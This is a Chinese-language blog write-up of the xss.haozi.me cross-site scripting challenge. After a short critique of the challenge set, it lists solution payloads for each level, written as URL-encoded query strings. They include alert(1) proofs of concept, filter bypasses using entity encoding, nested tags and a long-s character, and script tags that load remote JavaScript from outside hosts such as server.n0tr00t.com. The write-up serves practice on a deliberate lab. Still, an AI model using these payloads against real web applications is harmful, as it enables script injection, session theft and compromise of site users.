---
layout: post
title: xss.haozi.me writeup
---
> URL: https://xss.haozi.me/#/0x00
> 
> Github: https://github.com/haozime/xss-demo

吃饭前看到知乎上有帖子在讨论这个跨站题库，花了点时间通关，不过质量并没有想象中那么高，很多题可以构造通用 Payload 绕过，可能是出题者当时考虑的稍微少了一点。

另外好几关原封不动的拿 cure53 的 prompt (https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml) 题库来占位，有点儿想吐槽。

#### 0x00 ~ 0x09

    - http://xss.test/?input=%3Cscript%3Ealert(1)%3C/script%3E
    - http://xss.test/?input=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E
    - http://xss.test/?input=%22%3E%3E%3Cscript%3Ealert(1)%3C/script%3E
    - http://xss.test/?input=%22%3E%3E%3Cscript%3Ealert%601%60%3C/script%3E
    - http://xss.test/?input=%3Cimg%20src=%22x%22%20onerror=%22&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;%22%3E
    - http://xss.test/?input=asdasd%20--!%3E%3Cimg%20src=%22x%22%20onerror=%22&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;%22%3E
    - http://xss.test/?input=type=%22images%22%20onclick%0A=alert(1)
    - http://xss.test/?input=%3Csvg%20onload=alert(1)//
    - http://xss.test/?input=%3C/style%20%3E%3Cscript%3Ealert(1)%3C/script%3E
    - http://xss.test/?input=https://www.segmentfault.com@html5sec.org/test.js

#### 0x0A ~ 0x12

    - http://xss.test/?input=https://www.segmentfault.com@html5sec.org/test.js
    - http://xss.test/?input=%3Cscript%20src=%22https://server.n0tr00t.com/t.js%22%3E%3C/script%3E
    - http://xss.test/?input=%3Cscrscriptipt/**/src=%22https://server.n0tr00t.com/t.js%22%3E%3C/scscriptript%3E
    - http://xss.test/?input=%0Aalert(1)%0A--%3E
    - http://xss.test/?input=%3C%C5%BFcript%20src=https://server.n0tr00t.com/t.js%3E%3C/script%3E
    - http://xss.test/?input=%5C%5C');%0Aalert('1
    - http://xss.test/?input=alert(1);
    - http://xss.test/?input=asd%22);alert(%221
    - http://xss.test/?input=%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

![](https://ws1.sinaimg.cn/large/c334041bgy1fdwutpkrstj220q17mjzf.jpg)
